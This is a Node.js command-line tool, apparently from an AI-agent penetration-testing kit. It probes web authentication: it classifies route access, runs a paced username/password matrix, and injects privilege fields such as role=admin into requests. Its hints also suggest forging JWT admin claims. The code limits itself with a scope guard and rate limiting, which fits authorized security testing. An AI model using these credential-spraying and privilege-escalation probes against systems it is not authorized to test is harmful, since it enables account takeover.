#!/usr/bin/env node
// AuthN oracle (zero-dep). Deterministic answers to the questions weak models answer slowly
// and unreliably by hand-fuzzing:
//
//   node tools/authn-oracle.js routes <base> --file routes.txt [--token <jwt>] [--admin-token <jwt>]
//        [--method M] [--data D] [--header "K: V"]...
//     Classifies each path by BEHAVIOR instead of guessing: open / auth-gated / role-gated /
//     hidden-404 (the "auth-by-404" pattern that hides authenticated routes behind 404) /
//     login-redirect / other. A random control path calibrates whether 404 means anything here.
//
//   node tools/authn-oracle.js login <url> --users a,b --passwords x,y [--data '{"u":"{{u}}","p":"{{p}}"}']
//        [--method POST] [--max-attempts N]
//     Paced credential matrix. Clusters responses by (status, length, body hash): split clusters
//     across users with the SAME password => username enumeration; one 2xx/3xx => valid creds
//     (reported, never sprayed further); uniform 401 wall => rate-limit absence finding;
//     timing outliers flagged separately.
//
//   node tools/authn-oracle.js massassign <url> --data '{"name":"x"}' [--token <jwt>]
//        [--fields role,isAdmin,...] [--method POST]
//     Baseline body vs baseline+injected-field, one field at a time plus combined. Fields that
//     change the response are CANDIDATE mass-assignment sinks — verify impact manually before
//     recording anything.
//
// Every request is scope-guarded (fail-closed) and globally paced via pace.js. JSON out only.
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const fs = require('fs');
const { loadScope, inScope } = require('./scope-guard');
const pace = require('./pace');

const GARBAGE_TOKEN = 'garbage.invalid.token.' + crypto.randomBytes(6).toString('hex');
const DEFAULT_MASSASSIGN_FIELDS = ['role', 'isAdmin', 'admin', 'is_admin', 'userType', 'user_type',
  'permissions', 'scopes', 'group', 'level', 'privilege', 'verified', 'active'];
// boolean-ish field names get `true`, string roles get 'admin'
function injectionValue(field) {
  return /^(is[A-Z_]|has[A-Z_]|admin$|verified$|active$)/i.test(field) ? true : 'admin';
}

function request(u, method, headers, body, timeoutMs) {
  return new Promise((resolve) => {
    const t0 = Date.now();
    let done = false;
    const fin = (r) => { if (!done) { done = true; resolve(r); } };
    const req = (u.protocol === 'https:' ? https : http).request(u, { method, headers, timeout: timeoutMs }, (res) => {
      const chunks = [];
      let len = 0;
      res.on('data', (d) => { len += d.length; chunks.push(d); });
      res.on('end', () => fin({ status: res.statusCode, bytes: len, location: res.headers.location || null,
        body: Buffer.concat(chunks).toString('utf8'), ms: Date.now() - t0 }));
    });
    req.on('timeout', () => { req.destroy(); fin({ timeout: true, ms: Date.now() - t0 }); });
    req.on('error', (e) => fin({ error: e.message, ms: Date.now() - t0 }));
    if (body) req.write(body);
    req.end();
  });
}

function guard(target, scope) {
  const r = inScope(target, scope);
  if (!r.ok) {
    console.error(JSON.stringify({ blocked: target, reason: r.reason }));
    process.exit(1);
  }
}

async function send(urlStr, method, headers, body, timeoutMs, rps, scope) {
  guard(urlStr, scope);
  pace.wait(rps);
  return request(new URL(urlStr), method, headers, body, timeoutMs);
}

function buildHeaders(extra, token) {
  const h = {};
  for (const kv of extra || []) {
    const i = kv.indexOf(':');
    if (i > 0) h[kv.slice(0, i).trim()] = kv.slice(i + 1).trim();
  }
  if (token) h.Authorization = 'Bearer ' + token;
  return h;
}

const clusterKey = (r) => (r.status ?? 'ERR') + '|' + (r.bytes ?? 0) + '|' + crypto.createHash('sha1').update(String(r.body || '')).digest('hex').slice(0, 10);

// ---- routes ----
async function cmdRoutes(base, opts) {
  const scope = loadScope();
  const rps = scope.max_requests_per_second || 2;
  const paths = fs.existsSync(opts.file)
    ? fs.readFileSync(opts.file, 'utf8').split(/\r?\n/).map((l) => l.trim()).filter((l) => l && !l.startsWith('#'))
    : String(opts.file || '').split(',').map((s) => s.trim()).filter(Boolean);
  if (!paths.length) { console.error('no routes given (--file routes.txt comma-separated list)'); process.exit(2); }
  const baseU = new URL(base);
  const root = baseU.origin;

  // calibration: does a random unknown path actually 404?
  const controlPath = '/__control_' + crypto.randomBytes(5).toString('hex');
  const control = await send(root + controlPath, 'GET', {}, null, opts.timeout, rps, scope);
  const notFoundMeaningful = control.status === 404;

  const rows = [];
  for (const p of paths) {
    const url = p.startsWith('http') ? p : root + (p.startsWith('/') ? p : '/' + p);
    const probes = {};
    probes.none = await send(url, opts.method, buildHeaders(opts.headers, null), opts.data, opts.timeout, rps, scope);
    probes.garbage = await send(url, opts.method, buildHeaders(opts.headers, GARBAGE_TOKEN), opts.data, opts.timeout, rps, scope);
    if (opts.token) probes.user = await send(url, opts.method, buildHeaders(opts.headers, opts.token), opts.data, opts.timeout, rps, scope);
    if (opts.adminToken) probes.admin = await send(url, opts.method, buildHeaders(opts.headers, opts.adminToken), opts.data, opts.timeout, rps, scope);
    const st = (k) => (probes[k] ? probes[k].status : null);
    const ok = (k) => probes[k] && probes[k].status >= 200 && probes[k].status < 300;
    const denied = (k) => probes[k] && (probes[k].status === 401 || probes[k].status === 403);
    let klass;
    if (ok('none')) klass = 'open';
    else if (denied('none') && ok('admin')) klass = denied('user') || !probes.user ? 'role-gated' : 'auth-gated';
    else if ((denied('none') || denied('garbage')) && (ok('user') || ok('admin'))) klass = 'auth-gated';
    else if (probes.none && [301, 302, 303, 307].includes(probes.none.status) && /log(in|out)|signin|auth/i.test(probes.none.location || '')) klass = 'login-redirect';
    else if (notFoundMeaningful && [st('none'), st('garbage'), st('user'), st('admin')].every((s) => s === 404)) klass = 'hidden-404';
    else if (!notFoundMeaningful && st('none') === control.status) klass = 'indistinguishable';
    else klass = 'other';
    rows.push({ path: url.replace(root, '') || '/', klass,
      statuses: { none: st('none'), garbage: st('garbage'), user: st('user') || null, admin: st('admin') || null } });
  }
  const summary = rows.reduce((acc, r) => { acc[r.klass] = (acc[r.klass] || 0) + 1; return acc; }, {});
  const out = {
    base: root,
    calibration: { control_path: controlPath, control_status: control.status, not_found_meaningful: notFoundMeaningful },
    summary, rows,
    hints: [
      ...(summary['hidden-404'] ? ['hidden-404 routes exist but stay invisible: fuzz siblings/verbs/method-override around them, look for the auth endpoint that mints tokens for them (jwt.js attack --keys), check API docs/JS bundles for their real names'] : []),
      ...(summary['role-gated'] ? ['role-gated found: forge role/admin claims (jwt.js attack --set role=admin) and re-run with --admin-token'] : []),
      ...(!notFoundMeaningful ? ['control path did NOT 404 — this server answers something generic; 404-based classification is unreliable here, rely on status/body diffs instead'] : []),
    ],
  };
  return out;
}

// ---- login ----
async function cmdLogin(urlStr, opts) {
  const scope = loadScope();
  const rps = scope.max_requests_per_second || 2;
  const users = String(opts.users || '').split(',').map((s) => s.trim()).filter(Boolean);
  const passwords = String(opts.passwords || '').split(',').map((s) => s.trim()).filter(Boolean);
  if (!users.length || !passwords.length) { console.error('--users and --passwords required'); process.exit(2); }
  const pairs = [];
  outer:
  for (const p of passwords) for (const u of users) {
    pairs.push([u, p]);
    if (pairs.length >= (opts.maxAttempts || 40)) break outer;
  }
  const results = [];
  for (const [u, p] of pairs) {
    const sub = (s) => String(s == null ? '' : s).replace(/\{\{u\}\}/g, encodeURIComponent(u)).replace(/\{\{p\}\}/g, encodeURIComponent(p));
    const fullUrl = /\{\{u\}\}|\{\{p\}\}/.test(urlStr) ? sub(urlStr) : urlStr;
    const body = opts.data ? sub(opts.data) : (opts.form ? undefined : JSON.stringify({ username: u, password: p }));
    const headers = buildHeaders(opts.headers, null);
    if (body != null && !headers['Content-Type']) headers['Content-Type'] = 'application/json';
    const r = await send(fullUrl, opts.method, headers, body, opts.timeout, rps, scope);
    results.push({ user: u, password: p, ...r, cluster: clusterKey(r) });
  }
  const clusters = {};
  for (const r of results) (clusters[r.cluster] = clusters[r.cluster] || []).push(r);
  const times = results.map((r) => r.ms || 0).sort((a, b) => a - b);
  const median = times[Math.floor(times.length / 2)] || 0;
  const hit = results.find((r) => r.status >= 200 && r.status < 300);
  const enumSignal = [];
  for (const p of passwords) {
    const ks = new Set(results.filter((r) => r.password === p).map((r) => r.cluster));
    if (ks.size > 1) enumSignal.push(p);
  }
  const slow = [...new Set(results.filter((r) => (r.ms || 0) >= 3 * Math.max(median, 1)).map((r) => r.cluster))];
  const blocked = results.some((r) => r.status === 429 || /lock|blocked|too many|captcha/i.test(String(r.body || '')));
  return {
    url: urlStr, attempts: results.length,
    verdict: {
      valid_credentials: hit ? { user: hit.user } : null,
      username_enumeration: enumSignal.length ? enumSignal : false,
      rate_limit_or_lockout: blocked ? true : 'absent (' + results.length + ' attempts, uniform rejection)',
      timing_outliers: slow.length ? slow : false,
    },
    clusters: Object.entries(clusters).map(([k, v]) => ({ cluster: k, count: v.length,
      status: v[0].status, bytes: v[0].bytes, sample_users: [...new Set(v.map((x) => x.user))].slice(0, 4),
      body_head: String(v[0].body || '').slice(0, 120), median_ms: Math.round(v.reduce((a, x) => a + (x.ms || 0), 0) / v.length) })),
  };
}

// ---- massassign ----
async function cmdMassassign(urlStr, opts) {
  const scope = loadScope();
  const rps = scope.max_requests_per_second || 2;
  if (!opts.data) { console.error('massassign requires --data <json>'); process.exit(2); }
  let baseObj;
  try { baseObj = JSON.parse(opts.data); } catch (e) { console.error('--data must be valid JSON'); process.exit(2); }
  const fields = (opts.fields ? String(opts.fields).split(',') : DEFAULT_MASSASSIGN_FIELDS).map((s) => s.trim()).filter(Boolean);
  const headers = buildHeaders(opts.headers, opts.token);
  headers['Content-Type'] = 'application/json';
  const fire = async (obj) => send(urlStr, opts.method, headers, JSON.stringify(obj), opts.timeout, rps, scope);
  const base = await fire(baseObj);
  const baseKey = clusterKey(base);
  const probes = [];
  const changed = [];
  for (const f of fields) {
    const obj = Object.assign({}, baseObj, { [f]: injectionValue(f) });
    const r = await fire(obj);
    probes.push({ field: f, value: injectionValue(f), status: r.status, cluster: clusterKey(r), changed: clusterKey(r) !== baseKey });
    if (clusterKey(r) !== baseKey) changed.push(f);
  }
  // combined shot: every field at once (catches validators that only choke on singles)
  const allObj = Object.assign({}, baseObj);
  for (const f of fields) allObj[f] = injectionValue(f);
  const combined = await fire(allObj);
  return {
    url: urlStr, baseline: { status: base.status, bytes: base.bytes },
    accepted_candidates: changed,
    combined_probe: { status: combined.status, changed: clusterKey(combined) !== baseKey },
    probes,
    hint: 'changed fields are CANDIDATES ONLY — confirm real impact (privilege actually granted, object persisted) with repeater.js before recording a finding',
  };
}

// ---- CLI ----
const [cmd, arg1] = process.argv.slice(2);
function flag(name, dflt) {
  const i = process.argv.indexOf('--' + name);
  if (i >= 0 && process.argv[i + 1]) return process.argv[i + 1];
  return dflt;
}
function multi(name) {
  const out = [];
  for (let i = 0; i < process.argv.length; i++) if (process.argv[i] === '--' + name && process.argv[i + 1]) out.push(process.argv[i + 1]);
  return out;
}
async function main() {
  const common = {
    file: flag('file', null),
    token: flag('token', null), adminToken: flag('admin-token', null),
    headers: multi('header'), method: (flag('method', cmd === 'login' || cmd === 'massassign' ? 'POST' : 'GET')).toUpperCase(),
    data: flag('data', null), form: process.argv.includes('--form'),
    timeout: +flag('timeout', 10000), maxAttempts: +flag('max-attempts', 40),
    users: flag('users', null), passwords: flag('passwords', null),
    fields: flag('fields', null),
  };
  if (cmd === 'routes') {
    if (!arg1) { console.error('routes requires <base-url> and --file'); process.exit(2); }
    console.log(JSON.stringify(await cmdRoutes(arg1, common), null, 2));
  } else if (cmd === 'login') {
    console.log(JSON.stringify(await cmdLogin(arg1, common), null, 2));
  } else if (cmd === 'massassign') {
    console.log(JSON.stringify(await cmdMassassign(arg1, common), null, 2));
  } else {
    console.error('usage: node tools/authn-oracle.js routes|login|massassign ...\n' +
      '  routes <base> --file routes.txt [--token <jwt>] [--admin-token <jwt>] [--method M] [--data D]\n' +
      '  login <url> --users a,b --passwords x,y [--data \'{"u":"{{u}}","p":"{{p}}"}\'] [--max-attempts N]\n' +
      '  massassign <url> --data \'{"name":"x"}\' [--token <jwt>] [--fields role,isAdmin]');
    process.exit(2);
  }
}
if (require.main === module) main();
module.exports = { cmdRoutes, cmdLogin, cmdMassassign, clusterKey, injectionValue, GARBAGE_TOKEN };
